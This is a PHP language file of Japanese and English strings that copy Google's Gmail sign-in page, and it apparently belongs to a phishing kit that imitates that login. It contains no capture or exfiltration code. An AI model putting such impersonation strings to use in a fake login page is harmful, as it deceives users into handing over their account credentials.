<?php
/*
------------------
Language: Japan
------------------
*/
 
$lang = array();
// Header 
$lang['TITTLE'] = 'サインイン-Googleアカウント';
$lang['SIGN_IN'] = 'サインイン';
$lang['CONT_GMAIL'] = 'to continue to Gmail';
$lang['PASSWORD'] = 'Password';
$lang['EMAIL'] = 'Email or Phone';
$lang['NEXT'] = 'Next';
$lang['SIGN'] = 'サインイン';
$lang['FORGOT'] = 'パスワードをお忘れですか？';
$lang['ERROR'] = '間違ったユーザー名とパスワード';

//Google Log in
$lang['ONE'] = '1つのアカウント。 Googleのすべて.';
$lang['SIGN_WITH'] = 'Googleアカウントでサインインする';
$lang['STAY'] = 'サインイン状態';
$lang['KEEP_CHECKED'] = '便宜上、これをチェックしたままにしてください。 共有デバイスでは、追加の予防策が推奨されます.';
$lang['SIGN_DIFFERENT'] = '別のアカウントでログインする';
$lang['EVERYTHING'] = 'すべてのGoogleに1つのGoogleアカウント';
$lang['ABOUT'] = 'Googleについて';
$lang['PRIVACY'] = 'プライバシー';
$lang['TERM'] = '条項';
$lang['HELP'] = '助けて';
$lang['FIND_ACCOUNT'] = 'アカウントを探す';
$lang['CREATE'] = 'アカウントを作成する';
?>